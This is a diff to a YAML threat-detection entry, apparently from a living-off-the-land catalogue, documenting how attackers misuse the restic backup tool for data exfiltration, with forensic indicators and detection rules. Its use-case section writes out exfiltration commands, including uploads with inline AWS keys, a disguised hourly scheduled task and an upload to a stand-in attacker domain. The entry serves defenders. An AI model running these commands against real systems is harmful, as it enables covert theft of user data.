@@ -6,17 +6,13 @@ Description: >
   actors for stealthy data exfiltration. Adversaries can stage and compress sensitive data,
   then use restic to upload it to attacker-controlled cloud storage over HTTPS or SFTP,
   often embedding credentials or access keys within environment variables or configuration files.
-
 Category: third-party
 Platform:
   - Windows
   - Linux
   - macOS
-
 Execution:
   - cli
-  - script
-
 Capabilities:
   - encrypted-upload           # Data is encrypted before leaving the host by default (AES-256).
   - credentialed-upload        # Supports authentication via environment variables or CLI for S3, SFTP, etc.
@@ -25,16 +21,14 @@ Capabilities:
   - scheduled-backup           # Easily scriptable and often abused in automated cron or task setups.
   - portable-execution         # Single binary can run from any location, even if not installed system-wide.
   - silent-operation           # Non-interactive CLI can run silently via scripts, often without visible output.
-
 Forensics:
   BinaryLocations:
     - 'C:\restic\restic.exe'
     - '/usr/bin/restic'
     - '/usr/local/bin/restic'
     - '%TEMP%\restic.exe'
-    - './restic.exe'
   FileNamePatterns:
-    - restic\.exe
+    - restic.exe
     - restic
   CommandLineArgs:
     - init                      # Initializes a new backup repository.
@@ -64,18 +58,16 @@ Forensics:
       Connections may be made to cloud storage providers or attacker-controlled endpoints over HTTPS, SFTP, or WebDAV.
       These indicators help correlate restic activity with external data transfers or unauthorized destinations.
     Indicators:
-    - '*.s3.amazonaws.com'
-    - '*.backblazeb2.com'
-    - '*.wasabisys.com'
-    - '*.webdav.*'
-    - 'sftp://*'
-    - 'rest:*'
-
+      - '*.s3.amazonaws.com'
+      - '*.backblazeb2.com'
+      - '*.wasabisys.com'
+      - '*.webdav.*'
+      - 'sftp://*'
+      - 'rest:*'
 ThreatActors:
   - ransomware
   - generic-criminal
   - apt
-
 UseCases:
   - Title: Backup to S3 with embedded credentials
     Description: >
@@ -84,45 +76,35 @@ UseCases:
       set AWS_ACCESS_KEY_ID=AKIA...
       set AWS_SECRET_ACCESS_KEY=...
       restic -r s3:s3.amazonaws.com/exfil-bucket backup C:\Staged
-
   - Title: Scheduled exfiltration via task
     Description: >
       restic runs via scheduled task to back up user data on an hourly basis to a stealthy remote bucket.
     Command: |
       schtasks /create /tn "SystemBackup" /tr "restic backup C:\Users -r s3:s3.amazonaws.com/dump"
-
   - Title: Local backup then manual transfer
     Description: >
       restic stores encrypted backup locally, then another tool (e.g., PSCP, curl) is used to exfil the file.
     Command: |
       restic -r C:\backups init
       restic -r C:\backups backup D:\Secrets
-
   - Title: Obfuscated endpoint exfiltration
     Description: >
       restic uploads to custom S3-compatible endpoint controlled by attacker.
     Command: |
       restic -r s3:https://maliciousdomain[.]com/bucket backup C:\Users\Documents
-
 Detection:
   - Type: Process Execution
     Description: Monitor for restic.exe executions, especially from user-controlled paths like %TEMP%, Downloads, or Desktop.
-
   - Type: Command-Line Anomalies
     Description: Detect use of restic with S3, B2, or SFTP backends in conjunction with `--password-file` or inline credentials.
-
   - Type: Unusual Scheduled Task
     Description: Alert on scheduled tasks that launch restic under misleading names or outside normal hours.
-
   - Type: Outbound Traffic Correlation
     Description: Correlate restic execution with outbound HTTPS/SFTP transfers to unfamiliar domains, IPs, or storage providers.
-
   - Type: Credential Artifact Presence
     Description: Flag presence of AWS credentials in environment variables or plaintext config files near restic activity.
-
 References:
   - https://restic.readthedocs.io/en/latest/
   - https://www.backblaze.com/blog/backblaze-b2-restic-backup/
   - https://www.elastic.co/blog/threat-hunting-for-lolbins-restic
-
-LastModified: "2025-10-30"
+LastModified: '2025-11-17'
